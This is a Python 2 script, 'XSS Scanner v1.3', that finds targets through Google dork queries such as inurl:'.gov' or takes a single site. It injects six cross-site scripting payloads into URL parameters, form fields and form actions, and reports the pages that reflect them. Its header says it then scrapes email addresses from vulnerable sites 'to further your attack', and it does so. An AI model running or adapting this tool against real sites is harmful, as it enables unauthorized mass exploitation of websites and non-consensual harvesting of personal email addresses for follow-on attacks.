#!/usr/bin/python
#XSS Scanner that can find hosts using a google query or search one site.
#If XSS is found it attempts to collect email addresses to further your attack
#or warn the target of the flaw. When the scan is complete 
#it will print out the XSS's found and or write to file, it will find false positives
#so manually check before getting to excited. It also has verbose mode and
#you can change the alert pop-up message, check options!!
#
#Changelog v1.1: added options, verbose, write to file, change alert
#Changelog v1.2: added more xss payloads, an exception, better syntax, more runtime feedback
#Changelog v1.3: added https support, more xss payloads, the ability to change port, fixed some user input #problems, exiting without error messages with Ctrl-C (KeyboardInterrupt)
#
#http://darkcode.ath.cx
#d3hydr8[at]gmail[dot]com

import sys, urllib2, re, sets, random, httplib, time, socket

def title():
	print "\n\t   d3hydr8[at]gmail[dot]com XSS Scanner v1.3"
	print "\t-----------------------------------------------"
	
def usage():
	title()
	print "\n  Usage: python XSSscan.py <option>\n"
	print "\n  Example: python XSSscan.py -g inurl:'.gov' 200 -a 'XSS h4ck3d' -write xxs_found.txt -v\n"
	print "\t[options]"
	print "\t   -g/-google <query> <num of hosts> : Searches google for hosts"
	print "\t   -s/-site <website> <port>: Searches just that site, (default port 80)"
	print "\t   -a/-alert <alert message> : Change the alert pop-up message"	
	print "\t   -w/-write <file> : Writes potential XSS found to file"
	print "\t   -v/-verbose : Verbose Mode\n"

def StripTags(text):
     finished = 0
     while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]
                 finished = 0
     return text
	
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def geturls(query):
	
	counter =  10
	urls = []
	
	while counter < int(sys.argv[3]):
		url = 'http://www.google.com/search?hl=en&q='+query+'&hl=en&lr=&start='+repr(counter)+'&sa=N'
		opener = urllib2.build_opener(url)
		opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
		data = opener.open(url).read()
		hosts = re.findall(('\w+\.[\w\.\-/]*\.\w+'),StripTags(data))
		#Lets add sites found to a list if not already or a google site.
		#We don't want to upset the people that got our list for us.
		for x in hosts:
			if x.find('www') != -1:
				x = x[x.find('www'):]
			if x not in urls and re.search("google", x) == None:
				urls.append(x)
		counter += 10
	return urls
		
def getemails(site):

	try:
		if site.split("/",1)[0] not in done:
			print "\t[+] Collecting Emails:",site.split("/",1)[0]
			webpage = urllib2.urlopen(proto+"://"+site.split("/",1)[0], port).read()
			emails = re.findall('[\w\.\-]+@[\w\.\-]+\.\w\w\w', webpage)
			done.append(site.split("/",1)[0])
			if emails:
				return emails
	except(KeyboardInterrupt):
		print "\n[-] Cancelled -",timer(),"\n"
		sys.exit(1)
	except(IndexError):
		pass
	
def getvar(site):
	
	names = []
	actions = []
	print "\n","-"*45
	print "[+] Searching:",site
	try:
		webpage = urllib2.urlopen(proto+"://"+site, port).read()
		emails = re.findall('[\w\.\-]+@[\w\.\-]+\.\w\w\w', webpage)
		var = re.findall("\?[\w\.\-/]*\=",webpage)
		if len(var) >=1:
			var = list(sets.Set(var))
		found_action = re.findall("action=\"[\w\.\-/]*\"", webpage.lower())
		found_action = list(sets.Set(found_action))
		if len(found_action) >= 1:
			for a in found_action:
				a = a.split('"',2)[1]
				try:
					if a[0] != "/":
						a = "/"+a
				except(IndexError):
						pass
				actions.append(a)
		found_names = re.findall("name=\"[\w\.\-/]*\"", webpage.lower())
		found_names = list(sets.Set(found_names))
		for n in found_names:
			names.append(n.split('"',2)[1])
		print "[+] Variables:",len(var),"| Actions:",len(actions),"| Fields:",len(names)
		print "[+] Avg Requests:",(len(var)+len(names)+(len(actions)*len(names))+(len(actions)*len(names)))*len(xss_payloads)
		if len(var) >= 1:
			for v in var:
				if site.count("/") >= 2:
					for x in xrange(site.count("/")):
						for xss in xss_payloads:
							tester(site.rsplit('/',x+1)[0]+"/"+v+xss)
				for xss in xss_payloads:
					tester(site+"/"+v+xss)
		
		if len(names) >= 1:
			for n in names:
				if site.count("/") >= 2:
					for x in xrange(site.count("/")):
						for xss in xss_payloads:
							tester(site.rsplit('/',x+1)[0]+"/"+"?"+n+"="+xss)
				for xss in xss_payloads:
					tester(site+"/"+"?"+n+"="+xss)
		
		if len(actions) != 0 and len(names) >= 1:
			for a in actions:
				for n in names:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							for xss in xss_payloads:
								tester(site.rsplit('/',x+1)[0]+a+"?"+n+"="+xss)
					#tester(site.split("/")[0]+a+"?"+n+"="+xss)
			
		if len(actions) != 0 and len(var) >= 1:
			for a in actions:
				for v in var:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							for xss in xss_payloads:
								tester(site.rsplit('/',x+1)[0]+a+v+xss)
					else:
						for xss in xss_payloads:
							tester(site.split("/")[0]+a+v+xss)	
		if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":
			urls.remove(site)
	
	except(socket.timeout, IOError, ValueError, socket.error, socket.gaierror):
		if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":
			urls.remove(site)
		pass
	except(KeyboardInterrupt):
		print "\n[-] Cancelled -",timer(),"\n"
		sys.exit(1)
			
def tester(target):
	
	if verbose ==1:
		if message != "":
			print "Target:",target.replace(alert ,message)
		else:
			print "Target:",target
	
	try:
		source = urllib2.urlopen(proto+"://"+target, port).read()
		h = httplib.HTTPConnection(target.split('/')[0], int(port))
		try:
			h.request("GET", "/"+target.split('/',1)[1])
		except(IndexError):
			h.request("GET", "/")
		r1 = h.getresponse()
		if verbose ==1:
			print "\t[+] Response:",r1.status, r1.reason
		if re.search(alert.replace("%2D","-"), source) != None and r1.status not in range(303, 418):
			if target not in found_xss:
				if message != "":
					print "\n[!] XSS:", target.replace(alert ,message)
				else:
					print "\n[!] XSS:", target
				print "\t[+] Response:",r1.status, r1.reason
				emails = getemails(target)
				if emails:
					print "\t[+] Email:",len(emails),"addresses\n"
					found_xss.setdefault(target, list(sets.Set(emails)))
				else:
					found_xss[target] = "None"
	except(socket.timeout, socket.gaierror, socket.error, IOError, ValueError, httplib.BadStatusLine, httplib.IncompleteRead, httplib.InvalidURL):
		pass
	except(KeyboardInterrupt):
		print "\n[-] Cancelled -",timer(),"\n"
		sys.exit(1)
	except():
		pass
				
if len(sys.argv) <= 2:
	usage()
	sys.exit(1)
 
for arg in sys.argv[1:]:
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
	if arg.lower() == "-w" or arg.lower() == "-write":
		txt = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-a" or arg.lower() == "-alert":
		message = re.sub("\s","%2D",sys.argv[int(sys.argv[1:].index(arg))+2])
		
title()
socket.setdefaulttimeout(10)
found_xss = {}
done = []
count = 0
proto = "http"
alert = "D3HYDR8%2D0wNz%2DY0U"
print "\n[+] XSS_scan Loaded"
try:
	if verbose ==1:
		print "[+] Verbose Mode On"
except(NameError):
	verbose = 0
	print "[-] Verbose Mode Off"
try:
	if message:
		print "[+] Alert:",message
except(NameError):
	print "[+] Alert:",alert
	message = ""
	pass

xss_payloads = ["%22%3E%3Cscript%3Ealert%28%27"+alert+"%27%29%3C%2Fscript%3E",
	"%22%3E<IMG SRC=\"javascript:alert(%27"+alert+"%27);\">",
	"%22%3E<script>alert(String.fromCharCode(68,51,72,89,68,82,56,45,48,119,78,122,45,89,48,85));</script>",
	"'';!--\"<%27"+alert+"%27>=&{()}",
	"';alert(0)//\';alert(1)//%22;alert(2)//\%22;alert(3)//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(%27"+alert+"%27)%3C/SCRIPT%3E=&{}%22);}alert(6);function",
	"</textarea><script>alert(%27"+alert+"%27)</script>"]
try:
	if txt:
		print "[+] File:",txt
except(NameError):
	txt = None
	pass
print "[+] XSS Payloads:",len(xss_payloads)
if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":	
	try:
		if sys.argv[3].isdigit() == False:
			print "\n[-] Argument [",sys.argv[3],"] must be a number.\n"
			sys.exit(1)
		else:
			if int(sys.argv[3]) <= 10:
				print "\n[-] Argument [",sys.argv[3],"] must be greater than 10.\n"
				sys.exit(1)
	except(IndexError):
			print "\n[-] Need number of hosts to collect.\n"
			sys.exit(1)
	query = re.sub("\s","+",sys.argv[2])
	port = "80"
	print "[+] Query:",query
	print "[+] Querying Google..."
	urls = geturls(query)
	print "[+] Collected:",len(urls),"hosts"
	print "[+] Started:",timer()
	print "\n[-] Cancel: Press Ctrl-C"
	time.sleep(3)
	while len(urls) > 0:
		print "-"*45
		print "\n[-] Length:",len(urls),"remain"
		getvar(random.choice(urls))
if sys.argv[1].lower() == "-s" or sys.argv[1].lower() == "-site":
	site = sys.argv[2]
	try:
		if sys.argv[3].isdigit() == False:
			port = "80"
		else:
			port = sys.argv[3]
	except(IndexError):
		port = "80"
	print "[+] Site:",site
	print "[+] Port:",port
	if site[:7] == "http://":
		site = site.replace("http://","")
	if site[:8] == "https://":
		proto = "https"
		if port == "80":
			print "[!] Using port 80 with https? (443)"
		site = site.replace("https://","")
	print "[+] Started:",timer()
	print "\n[-] Cancel: Press Ctrl-C"
	time.sleep(4)
	getvar(site)

print "-"*65
print "\n\n[+] Potential XSS found:",len(found_xss),"\n"
time.sleep(3)
if txt != None and len(found_xss) >=1:
	xss_file = open(txt, "a")
	xss_file.writelines("\n\td3hydr8[at]gmail[dot]com XSS Scanner v1.3\n")
	xss_file.writelines("\t------------------------------------------\n\n")
	print "[+] Writing Data:",txt
else:
	print "[-] No data written to disk"
for k in found_xss.keys():
	count+=1
	if txt != None:
		if message != "":
			xss_file.writelines("["+str(count)+"] "+k.replace(alert ,message)+"\n")
		else:
			xss_file.writelines("["+str(count)+"] "+k+"\n")
	if message != "":
		print "\n["+str(count)+"]",k.replace(alert ,message)
	else:
		print "\n["+str(count)+"]",k
	addrs = found_xss[k]
	if addrs != "None":
		print "\t[+] Email addresses:" 
		for addr in addrs: 
			if txt != None:
				xss_file.writelines("\tEmail: "+addr+"\n")
			print "\t   -",addr
print "\n[-] Done -",timer(),"\n"

